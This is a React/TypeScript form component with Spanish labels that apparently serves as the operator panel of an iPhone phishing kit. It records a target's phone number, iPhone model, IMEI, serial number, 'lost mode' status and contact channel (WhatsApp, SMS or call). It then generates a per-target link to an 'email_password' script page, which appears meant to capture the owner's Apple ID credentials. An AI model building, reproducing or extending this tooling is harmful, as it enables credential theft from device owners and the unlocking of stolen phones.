import React, { useState, useEffect } from 'react';
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Label } from '@/components/ui/label';
import { Textarea } from '@/components/ui/textarea';
import { supabase } from '@/integrations/supabase/client';
import { useToast } from '@/hooks/use-toast';
import CustomSelect from './CustomSelect';
import { countryCodes } from '@/utils/countryCodes';
import { iphoneModels, iphoneImages } from '@/utils/iphoneImages';
import ProcessUrlDisplay from './ProcessUrlDisplay';

interface ProcessFormProps {
  userType: 'admin' | 'user';
}

const ProcessForm: React.FC<ProcessFormProps> = ({ userType }) => {
  const [formData, setFormData] = useState({
    clientName: '',
    ownerName: '',
    phoneNumber: '',
    countryCode: '+1',
    iphoneModel: '',
    color: '',
    storage: '',
    imei: '',
    serialNumber: '',
    contactType: 'whatsapp',
    lostMode: false
  });

  const [isLoading, setIsLoading] = useState(false);
  const [createdUrl, setCreatedUrl] = useState<string>('');
  const { toast } = useToast();

  const colors = ['Negro', 'Blanco', 'Rojo', 'Azul', 'Verde', 'Amarillo', 'Morado', 'Rosa', 'Oro', 'Plata'];
  const storageOptions = ['64GB', '128GB', '256GB', '512GB', '1TB'];
  const contactTypes = [
    { value: 'whatsapp', label: 'WhatsApp' },
    { value: 'sms', label: 'SMS' },
    { value: 'llamada', label: 'Llamada' }
  ];

  const generateIMEI = () => {
    const imei = Array.from({ length: 15 }, () => Math.floor(Math.random() * 10)).join('');
    setFormData(prev => ({ ...prev, imei }));
  };

  const generateSerial = () => {
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    const serial = Array.from({ length: 10 }, () => chars.charAt(Math.floor(Math.random() * chars.length))).join('');
    setFormData(prev => ({ ...prev, serialNumber: serial }));
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsLoading(true);

    try {
      const { data: { user } } = await supabase.auth.getUser();
      if (!user) throw new Error('Usuario no autenticado');

      const processData = {
        user_id: user.id,
        client_name: formData.clientName,
        owner_name: formData.ownerName || null,
        phone_number: formData.phoneNumber,
        country_code: formData.countryCode,
        iphone_model: formData.iphoneModel,
        color: formData.color,
        storage: formData.storage,
        imei: formData.imei,
        serial_number: formData.serialNumber,
        contact_type: formData.contactType,
        lost_mode: formData.lostMode
      };

      console.log('Submitting process data:', processData);

      const { data, error } = await supabase
        .from('processes')
        .insert([processData])
        .select()
        .single();

      if (error) {
        console.error('Supabase error:', error);
        throw error;
      }

      console.log('Process created successfully:', data);

      // Generate URL for the process
      const baseUrl = window.location.origin;
      const processUrl = `${baseUrl}/script/email_password?process=${data.id}`;
      setCreatedUrl(processUrl);

      toast({
        title: "Proceso creado exitosamente",
        description: `El proceso para ${formData.clientName} ha sido creado.`,
      });

      // Reset form
      setFormData({
        clientName: '',
        ownerName: '',
        phoneNumber: '',
        countryCode: '+1',
        iphoneModel: '',
        color: '',
        storage: '',
        imei: '',
        serialNumber: '',
        contactType: 'whatsapp',
        lostMode: false
      });

    } catch (error) {
      console.error('Error creating process:', error);
      toast({
        title: "Error",
        description: "No se pudo crear el proceso. Intenta nuevamente.",
        variant: "destructive"
      });
    } finally {
      setIsLoading(false);
    }
  };

  // If URL was created, show the URL display component
  if (createdUrl) {
    return (
      <div className="space-y-6">
        <ProcessUrlDisplay 
          url={createdUrl} 
          processName={formData.clientName}
        />
        <Button
          onClick={() => {
            setCreatedUrl('');
            // Reset form data as well
            setFormData({
              clientName: '',
              ownerName: '',
              phoneNumber: '',
              countryCode: '+1',
              iphoneModel: '',
              color: '',
              storage: '',
              imei: '',
              serialNumber: '',
              contactType: 'whatsapp',
              lostMode: false
            });
          }}
          className="w-full bg-blue-600/20 hover:bg-blue-600/30 text-blue-300 border border-blue-500/30"
        >
          Crear Otro Proceso
        </Button>
      </div>
    );
  }

  return (
    <Card className="bg-black/20 backdrop-blur-xl border border-blue-500/20">
      <CardHeader>
        <CardTitle className="text-blue-300">Crear Nuevo Proceso WhatsApp</CardTitle>
      </CardHeader>
      <CardContent>
        <form onSubmit={handleSubmit} className="space-y-4">
          <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
            <div>
              <Label htmlFor="clientName" className="text-blue-300">
                Nombre del Cliente *
              </Label>
              <Input
                id="clientName"
                value={formData.clientName}
                onChange={(e) => setFormData(prev => ({ ...prev, clientName: e.target.value }))}
                className="bg-black/30 border-blue-500/30 text-white"
                required
              />
            </div>

            <div>
              <Label htmlFor="ownerName" className="text-blue-300">
                Nombre del Propietario
              </Label>
              <Input
                id="ownerName"
                value={formData.ownerName}
                onChange={(e) => setFormData(prev => ({ ...prev, ownerName: e.target.value }))}
                className="bg-black/30 border-blue-500/30 text-white"
                placeholder="Opcional"
              />
            </div>
          </div>

          <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
            <div>
              <Label className="text-blue-300">Código de País</Label>
              <CustomSelect
                value={formData.countryCode}
                onChange={(value) => setFormData(prev => ({ ...prev, countryCode: value }))}
                options={countryCodes.map(country => ({
                  value: country.code,
                  label: `${country.flag} ${country.code} ${country.name}`
                }))}
                placeholder="Seleccionar código"
              />
            </div>

            <div className="md:col-span-2">
              <Label htmlFor="phoneNumber" className="text-blue-300">
                Número de Teléfono *
              </Label>
              <Input
                id="phoneNumber"
                value={formData.phoneNumber}
                onChange={(e) => setFormData(prev => ({ ...prev, phoneNumber: e.target.value }))}
                className="bg-black/30 border-blue-500/30 text-white"
                placeholder="1234567890"
                required
              />
            </div>
          </div>

          <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
            <div>
              <Label className="text-blue-300">Modelo de iPhone *</Label>
              <CustomSelect
                value={formData.iphoneModel}
                onChange={(value) => setFormData(prev => ({ ...prev, iphoneModel: value }))}
                options={iphoneModels.map(model => ({ value: model, label: model }))}
                placeholder="Seleccionar modelo"
                required
              />
            </div>

            <div>
              <Label className="text-blue-300">Color *</Label>
              <CustomSelect
                value={formData.color}
                onChange={(value) => setFormData(prev => ({ ...prev, color: value }))}
                options={colors.map(color => ({ value: color, label: color }))}
                placeholder="Seleccionar color"
                required
              />
            </div>
          </div>

          <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
            <div>
              <Label className="text-blue-300">Almacenamiento *</Label>
              <CustomSelect
                value={formData.storage}
                onChange={(value) => setFormData(prev => ({ ...prev, storage: value }))}
                options={storageOptions.map(storage => ({ value: storage, label: storage }))}
                placeholder="Seleccionar almacenamiento"
                required
              />
            </div>

            <div>
              <Label className="text-blue-300">Tipo de Contacto</Label>
              <CustomSelect
                value={formData.contactType}
                onChange={(value) => setFormData(prev => ({ ...prev, contactType: value }))}
                options={contactTypes}
                placeholder="Seleccionar tipo"
              />
            </div>
          </div>

          <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
            <div>
              <div className="flex items-center justify-between">
                <Label htmlFor="imei" className="text-blue-300">IMEI *</Label>
                <Button
                  type="button"
                  onClick={generateIMEI}
                  className="text-xs bg-green-600/20 hover:bg-green-600/30 text-green-300 border border-green-500/30 h-6 px-2"
                >
                  Generar
                </Button>
              </div>
              <Input
                id="imei"
                value={formData.imei}
                onChange={(e) => setFormData(prev => ({ ...prev, imei: e.target.value }))}
                className="bg-black/30 border-blue-500/30 text-white"
                maxLength={15}
                required
              />
            </div>

            <div>
              <div className="flex items-center justify-between">
                <Label htmlFor="serialNumber" className="text-blue-300">Número de Serie *</Label>
                <Button
                  type="button"
                  onClick={generateSerial}
                  className="text-xs bg-green-600/20 hover:bg-green-600/30 text-green-300 border border-green-500/30 h-6 px-2"
                >
                  Generar
                </Button>
              </div>
              <Input
                id="serialNumber"
                value={formData.serialNumber}
                onChange={(e) => setFormData(prev => ({ ...prev, serialNumber: e.target.value }))}
                className="bg-black/30 border-blue-500/30 text-white"
                maxLength={10}
                required
              />
            </div>
          </div>

          <div className="flex items-center space-x-2">
            <input
              type="checkbox"
              id="lostMode"
              checked={formData.lostMode}
              onChange={(e) => setFormData(prev => ({ ...prev, lostMode: e.target.checked }))}
              className="rounded border-blue-500/30"
            />
            <Label htmlFor="lostMode" className="text-blue-300">
              Modo perdido activado
            </Label>
          </div>

          <Button
            type="submit"
            disabled={isLoading}
            className="w-full bg-blue-600/20 hover:bg-blue-600/30 text-blue-300 border border-blue-500/30"
          >
            {isLoading ? 'Creando...' : 'Crear Proceso'}
          </Button>
        </form>
      </CardContent>
    </Card>
  );
};

export default ProcessForm;
